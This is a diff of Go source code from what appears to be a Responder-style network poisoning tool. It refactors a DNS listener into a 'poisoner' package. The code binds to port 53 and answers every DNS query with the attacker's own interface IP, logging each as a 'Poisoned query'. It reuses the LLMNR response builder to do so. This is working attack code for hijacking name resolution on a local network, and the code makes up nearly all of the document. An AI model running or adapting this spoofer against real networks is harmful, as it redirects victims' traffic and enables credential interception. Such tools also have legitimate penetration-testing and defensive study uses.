@@ -1,19 +1,20 @@
-package main
+package poisoner
 
 import (
 	"encoding/binary"
 	"fmt"
 	"net"
+
+	"go-responder/internal/core"
 )
 
-func serveDNS(ifaceIP net.IP) {
-	// UDP
+func ServeDNS(ifaceIP net.IP) {
 	conn, err := net.ListenPacket("udp4", fmt.Sprintf("%s:53", ifaceIP))
 	if err != nil {
-		logError("DNS UDP listen :53 — %v (need root?)", err)
+		core.LogError("DNS UDP listen :53 — %v (need root?)", err)
 		return
 	}
-	logInfo("DNS  listening on %s:53 (UDP+TCP)", ifaceIP)
+	core.LogInfo("DNS  listening on %s:53 (UDP+TCP)", ifaceIP)
 	go serveDNSTCP(ifaceIP)
 
 	buf := make([]byte, 512)
@@ -24,7 +25,7 @@ func serveDNS(ifaceIP net.IP) {
 		}
 		pkt := make([]byte, n)
 		copy(pkt, buf[:n])
-		go handleDNSQuery(conn, src, pkt, ifaceIP)
+		go HandleDNSQuery(conn, src, pkt, ifaceIP)
 	}
 }
 
@@ -49,16 +50,16 @@ func serveDNSTCP(ifaceIP net.IP) {
 			if _, err := readFull(c, pkt); err != nil {
 				return
 			}
-			name := parseLLMNRQuery(pkt)
+			name := ParseLLMNRQuery(pkt)
 			if name == "" {
 				return
 			}
-			logVerbose("DNS/TCP query: %s", name)
-			if analyzeMode {
-				logInfo("[DNS] [Analyze] query for '%s'", name)
+			core.LogVerbose("DNS/TCP query: %s", name)
+			if core.AnalyzeMode {
+				core.LogInfo("[DNS] [Analyze] query for '%s'", name)
 				return
 			}
-			resp := buildDNSResponse(pkt, ifaceIP)
+			resp := BuildDNSResponse(pkt, ifaceIP)
 			if resp == nil {
 				return
 			}
@@ -70,30 +71,27 @@ func serveDNSTCP(ifaceIP net.IP) {
 	}
 }
 
-func handleDNSQuery(conn net.PacketConn, src net.Addr, pkt []byte, ip net.IP) {
-	name := parseLLMNRQuery(pkt)
+func HandleDNSQuery(conn net.PacketConn, src net.Addr, pkt []byte, ip net.IP) {
+	name := ParseLLMNRQuery(pkt)
 	if name == "" {
 		return
 	}
-	logVerbose("DNS  query: %s from %s", name, src)
-	if analyzeMode {
-		logInfo("[DNS] [Analyze] query for '%s' from %s", name, src)
+	core.LogVerbose("DNS  query: %s from %s", name, src)
+	if core.AnalyzeMode {
+		core.LogInfo("[DNS] [Analyze] query for '%s' from %s", name, src)
 		return
 	}
-	resp := buildDNSResponse(pkt, ip)
+	resp := BuildDNSResponse(pkt, ip)
 	if resp != nil && conn != nil {
 		conn.WriteTo(resp, src)
-		logInfo("[DNS] Poisoned query for '%s' — responding with %s", name, ip)
+		core.LogInfo("[DNS] Poisoned query for '%s' — responding with %s", name, ip)
 	}
 }
 
-// buildDNSResponse builds a DNS A-record answer for any query type.
-// Reuses the LLMNR response builder since the wire format is identical.
-func buildDNSResponse(query []byte, ip net.IP) []byte {
-	return buildLLMNRResponse(query, ip)
+func BuildDNSResponse(query []byte, ip net.IP) []byte {
+	return BuildLLMNRResponse(query, ip)
 }
 
-// readFull is a helper for TCP DNS reading
 func readFull(c net.Conn, buf []byte) (int, error) {
 	total := 0
 	for total < len(buf) {
